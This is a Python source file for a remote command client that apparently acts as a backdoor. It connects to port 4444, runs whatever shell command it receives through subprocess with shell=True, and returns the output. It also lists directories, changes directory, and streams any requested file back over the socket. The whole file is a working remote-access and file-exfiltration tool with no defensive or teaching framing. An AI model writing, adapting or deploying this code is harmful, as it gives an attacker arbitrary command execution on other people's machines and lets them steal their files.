
import os
import pickle
from pyclbr import Function
import re
import socket
import subprocess

from re import sub
from typing import List, Union


PORT: int = 4444
HEADER: int = 64
FORMAT: str = "utf-8"
HOST: str = socket.gethostbyname(socket.gethostname())
CLIENT: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ADDR: tuple = (HOST, PORT)
CHUNK_SIZE: int = 1096


def handle_error(func) -> Function:
    def handle(self, *args, **kwargs):
        try:
            return func(self, *args, **kwargs)
        except Exception as e:
            self.send_pickled_data(False, "", str(e))
    return handle


class Client:
    def __init__(self) -> None:
        self.client: socket.socket = CLIENT

    def getnames(self) -> List:
        return [i[3:] for i in dir(self) if i.startswith("do_")]

    def connect(self) -> None:
        while True:
            self.client.connect(ADDR)
            print("# connected ...")
            while True:
                rc: str = self.recv().decode(FORMAT)
                if (cm := rc.split(" ")[0]) in self.getnames():
                    getattr(self, "do_" + cm)(' '.join(rc.split(" ")[1:]))
                else:
                    self.default(rc)

    def _path_parse(self, path: str) -> str:
        if not path:
            return '.'
        path: str = re.sub('%', '', path)
        path: str = re.sub('$', '', path).replace("~", "HOME")
        for key in os.environ.keys():
            if path == key:
                return os.environ[key]
        return path

    def default(self, command: str) -> None:
        output: str = self.excute(command)
        self.send(output.encode(FORMAT))

    def send(self, msg: bytes) -> None:
        length: int = len(msg)
        self.client.send(f"{length}{' ' * (HEADER - length)}".encode(FORMAT))
        self.client.send(msg)

    def recv(self) -> bytes:
        if (rc := self.client.recv(HEADER)):
            length: int = int(rc.decode(FORMAT))
            return self.client.recv(length)
        return rc

    def excute(self, command: str) -> str:
        output: subprocess.Popen = subprocess.Popen(
            command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return "\n".join(output.communicate())

    def send_pickled_data(self, status: bool, content: str, error: str) -> None:
        pickled_data: bytes = pickle.dumps(
            {"status": status, "content": content, "error": error})
        self.send(pickled_data)

    @handle_error
    def do_ls(self, arg: str, send: bool = True) -> Union[None, List]:
        path: str = self._path_parse(arg.strip())
        files: list = os.listdir(path)
        for i in range(len(files)):
            if os.path.isdir(f := files[i]):
                files[i] = f"{f}/"
        if send:
            self.send_pickled_data(True, files, "")
        else:
            return files

    @handle_error
    def do_cd(self, arg: str) -> None:
        os.chdir(self._path_parse(arg.strip()))
        self.send_pickled_data(True, [self.do_ls(".", False), os.getcwd()], "")

    @handle_error
    def do_download(self, arg: str) -> None:
        self.send_pickled_data(True, os.path.getsize(arg), "")
        with open(arg, "rb") as f:
            while True:
                data: bytes = f.read(CHUNK_SIZE)
                if not data:
                    break
                self.client.send(data)
        print("Done")


client: Client = Client()
client.connect()
